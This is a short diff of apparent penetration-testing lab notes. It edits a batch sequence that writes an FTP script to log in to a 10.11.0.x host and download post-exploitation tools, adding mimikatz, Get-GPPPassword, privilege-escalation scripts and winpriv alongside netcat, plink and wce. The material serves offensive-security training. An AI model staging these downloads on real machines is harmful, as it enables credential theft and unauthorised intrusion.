@@ -6,6 +6,7 @@ echo 10.11.0.**>>ftp.txt
 echo offsec>>ftp.txt
 echo ******>>ftp.txt
 echo bin>>ftp.txt
+echo GET accesschk-XP.exe >> ftp.txt
 echo GET accesschk.exe >> ftp.txt
 echo GET accesschk64.exe >> ftp.txt
 echo GET nc.exe >> ftp.txt 
@@ -13,8 +14,13 @@ echo GET plink.exe >> ftp.txt
 echo GET wce32.exe >> ftp.txt 
 echo GET wce64.exe >> ftp.txt 
 echo GET wget.exe >> ftp.txt
+echo GET Get-GPPPassword.ps1 >> ftp.txt
+echo GET mimikatz_64.exe >> ftp.txt
+echo GET mimikatz_32.exe >> ftp.txt
+echo GET privesc1.bat >> ftp.txt
+echo GET privesc2.bat >> ftp.txt
 echo GET wmic_info.bat >> ftp.txt 
-echo GET wget.exe >> ftp.txt
+echo GET winpriv.exe >> ftp.txt
 echo bye >> ftp.txt
 
 Run below command after running above ones:
